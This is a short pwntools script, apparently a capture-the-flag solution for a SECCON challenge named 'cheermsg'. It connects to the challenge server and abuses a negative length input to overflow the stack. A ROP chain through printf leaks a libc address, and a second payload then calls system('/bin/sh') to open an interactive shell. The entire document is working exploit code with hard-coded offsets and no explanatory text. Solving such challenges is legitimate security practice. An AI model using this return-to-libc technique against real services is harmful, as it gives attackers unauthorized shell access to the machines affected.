from pwn import *
context.log_level = 'debug'
MAIN = 0x080485CA
PRINTF = 0x08048430

r = remote('cheermsg.pwn.seccon.jp', 30527)
raw_input()
x = "-158\n"
x += p32(PRINTF) + p32(0x080487AF) + p32(0x804A010) + p32(PRINTF) + p32(MAIN) + p32(0x080487E0)
x += "\n"

r.recvuntil(">>")
r.send(x)
r.recvuntil("Message : \n")
libc_base = u32(r.readline()[:4]) - 0x0004d410
system = libc_base + 0x00040310
bin_sh = libc_base + 0x0016084C

x = "-158\n" + p32(system) + "BBBB" + p32(bin_sh) + "\n"
r.send(x)
r.interactive()

